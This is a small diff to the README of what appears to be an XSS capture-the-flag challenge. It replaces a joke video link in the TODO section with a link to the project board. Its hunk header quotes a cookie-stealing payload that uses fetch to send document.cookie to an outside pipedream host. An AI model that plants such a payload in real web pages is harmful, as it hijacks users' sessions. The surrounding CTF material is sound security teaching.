@@ -14,5 +14,5 @@ fetch('https://our.domain.pipedream.net/?c=' + document['cookie'])
 Guide for installation, configuration and running is available [here](DEPLOY.md)
 
 ### TODO
-Plans for project improvement can be found [here](https://www.youtube.com/watch?v=dQw4w9WgXcQ) <br>
+Plans for project improvement can be found [here](https://github.com/leshark/xss-ctf-challenge/projects/1) <br>
 Issues and PR's are welcome!
